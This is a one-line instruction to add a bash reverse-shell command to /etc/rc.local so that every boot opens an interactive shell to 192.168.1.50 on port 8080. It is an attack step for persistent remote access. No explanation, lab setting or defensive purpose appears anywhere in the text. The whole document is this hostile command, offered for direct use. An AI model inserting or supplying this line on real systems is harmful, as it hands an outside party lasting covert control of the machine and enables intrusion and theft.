Insert this line before "exit 0" in /etc/rc.local: bash -i >& /dev/tcp/192.168.1.50/8080 0>&1 &
